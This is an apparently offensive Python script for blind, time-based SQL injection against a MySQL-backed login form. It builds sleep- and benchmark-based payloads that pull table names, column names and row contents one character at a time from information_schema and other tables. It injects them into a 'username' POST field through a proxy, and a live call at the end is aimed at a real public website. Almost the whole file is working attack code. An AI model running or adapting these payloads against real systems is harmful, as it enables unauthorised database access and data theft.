#!/usr/bin/python3
#coding:utf-8 

import string
import requests
import time
import hackhttp
from urllib.parse import quote,unquote

asciiLetters = string.ascii_letters 
hexdigits = string.hexdigits
digits = string.digits
printable = string.printable

class log():
    global DEBUG

    colorTable = {
        "success":"\033[1;32m+\033[0m",
        "error": "\033[1;31m!\033[0m",
        "info":"\033[1;34m*\033[0m",
        "debug":"\033[1;31mDEBUG\033[0m"
    }

    @staticmethod
    def success(string):
        print("[{}] {}".format( log.colorTable["success"],string))

    @staticmethod
    def error(string):
        print("[{}] {}".format( log.colorTable["error"],string))

    @staticmethod
    def info(string):
        print("[{}] {}".format( log.colorTable["info"],string))
    
    @staticmethod
    def debug(string):
        if DEBUG:
            print("[{}] {}".format(log.colorTable["debug"],string))

# global set

DEBUG = True

index1 =  "select substr(({content}),{index},1) = '{value}'"
index2 =  "select ascii(substr(({content}),{index},1)) = {value}"
errorCondition = "if(({content}),exp(800),0)"
sleepCondition1 = "if(({content}),sleep(5),0)"
sleepCondition2 = "if(({content}),benchmark(20000000,md5(1)),0)"

class SqlInject():
    
    def __init__(self):

        pass

    def readTableName(self,length):
        getTableName = "select group_concat(table_name) from  information_schema.tables where table_schema=database()"
        strTable = asciiLetters + ","
        for i in range(length):
            for j in strTable:
                index = index2.format( content = getTableName,index = i,value=ord(j))
                # log.debug(condition)
                condition = sleepCondition1.format( content = index)
                log.debug(condition)
                yield condition

    def readColumnName(self,length,table):
        getColumnName = "select  group_concat(COLUMN_NAME)  from  COLUMNS where   table_name='{table}' and table_schema=database()"
        strTable = asciiLetters + ","
        for i in range(length):
            for j in strTable:
                getColumnNameReal = getColumnName.format( table = table)

                index = index2.format( content = getColumnNameReal,index = i,value=ord(j))
                # log.debug(condition)
                condition = sleepCondition1.format( content = index)
                log.debug(condition)
                yield condition

    def readContent(self,start,end,line,table,column):
        strTable = printable
        getContent1 = "select {column} from {table} limit {line},1"
        getContent2 = "select group_concat({column}) from {table}"

        for i in range(start,end):
            for j in strTable:
                getContent = getContent1.format( column=column , table=table,line=line)
                index = index2.format( content = getContent,index = i,value=ord(j))
                # log.debug(condition)
                condition = sleepCondition1.format( content = index)
                log.debug(condition)
                yield condition
    
    def sendRequest(self,url,proxy=None):
        hh = hackhttp.hackhttp()

        for payload in self.readTableName(30):
            data = "username=' and {p}--+&password=123456".format(p=payload)
            if proxy:
                log.debug(data)
                code, head, body, redirect, logs = hh.http(url,post=data,proxy=proxy)
                log.debug(logs["request"])
            else:
                code, head, body, redirect, logs = hh.http(url,post=data)
                log.debug(data)

sqlInject = SqlInject()

# sqlInject.readContent(0,10,0,"mysql.user","user")

sqlInject.sendRequest("http://www.baidu.com/",("127.0.0.1",8080))




















